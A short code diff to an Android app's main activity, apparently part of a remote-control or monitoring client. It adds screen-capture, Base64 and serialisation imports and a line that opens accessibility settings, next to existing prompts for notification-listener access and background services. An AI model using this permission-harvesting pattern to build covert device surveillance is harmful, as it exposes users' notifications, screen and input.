@@ -12,10 +12,13 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.location.LocationManager;
+import android.media.projection.MediaProjectionManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Messenger;
 import android.provider.Settings;
+import android.util.Base64;
 import android.util.Log;
 
 import com.ot.grhq.client.functionality.FileManager;
@@ -28,8 +31,10 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.ObjectOutputStream;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
@@ -92,6 +97,9 @@ public class MainActivity extends AppCompatActivity {
         {
             startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
         }
+
+
+        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         startService(new Intent(this, NotificationListener.class));
         startService(new Intent(this, ForegroundService.class));
     }
